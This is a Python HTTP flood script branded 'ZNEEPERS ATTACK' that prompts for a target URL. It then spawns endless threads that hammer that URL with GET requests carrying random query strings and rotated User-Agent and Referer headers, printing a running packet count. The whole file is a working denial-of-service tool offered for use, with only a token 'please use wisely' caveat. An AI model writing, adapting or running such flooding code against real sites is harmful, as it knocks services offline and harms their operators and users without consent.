#!usr/bin/python
import os
import requests
import threading
import datetime
import sys
import random
import string
import colorama

# Colors
class bcolors:
    HEADER = '\e[95m'
    OKBLUE = '\e[94m'
    OKCYAN = '\e[96m'
    OKGREEN = '\e[92m'
    WARNING = '\e[93m'
    UNDERLINE = '\e[4m'
    PURPLE = '\033[97m'
    BOLD    = "\e[1m"
    BLACK   = "\e[30m"
    RED     = "\e[31m"
    GREEN   = "\e[32m"
    YELLOW  = "\e[33m"
    BLUE    = "\e[34m"
    MAGENTA = "\e[35m"
    CYAN    = "\e[36m"
    WHITE   = "\e[37m"
 

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")
    print(" ")                                  
print("\033[31m            ©©      ©     ©© ©    © © © ©©   © © © ©©      \033[0m")
print("\033[31m            ©© ©    ©   ©© • • ©  •    ©©    •    ©©       \033[0m")                 
print("\033[31m            ©©  ©   ©   ©© • • ©      ©© •       ©© •      \033[0m")                 
print("\033[96m            ©©   ©  ©   ©©  •  ©     ©©  •      ©©  •      \033[0m")             
print("\033[96m            ©©  • © ©   ©©     ©    ©©         ©©          \033[0m")            
print("\033[96m            ©©  • • ©   • ©© ©     ©© © © ©   ©© © © ©     \033[0m")            
print("\033[96m            ••  • • •   • •• •     ••   • •   ••    •      \033[0m")            
print("\033[96m             •  •   •   •   •      •  •  •    •   •        \033[0m")             
print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")     
print("\033[1m             Z  N  E  E  P  E  R  S    A  T  T  A  C  K                \033[0m")    
print("\033[33m                         design By: ZA'99                             \033[0m")   
print("\033[1m                   —°0  please use wisely  0°—                         \033[0m")    
print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")      
print("\033[32m======================================================================\033[0m")
url = input("URL:  ").strip()

u = int(0)
headers = []
referer = [
    "https://github.com/",
    "https://google.it/",
    "https://facebook.com/",
    "https://alibaba.com/",
    "https://google.com/",
    "https://youtube.com",
    
]


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global u
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                u += 1
                print("[☀️] \e[34mNOZZ:  \e[32m " +str(u)+ "   \e[33mשלח את החבילה אל\e[36m   " +url+ "\e[0m" )
                print("[☀️] \e[96mNOZZ:  \e[94m " +str(u)+ "   \e[91mשלח את החבילה אל\e[92m   " +url+ "\e[0m" )
            except requests.exceptions.ConnectionError:
                print ("[Server might be down!]")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Error]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
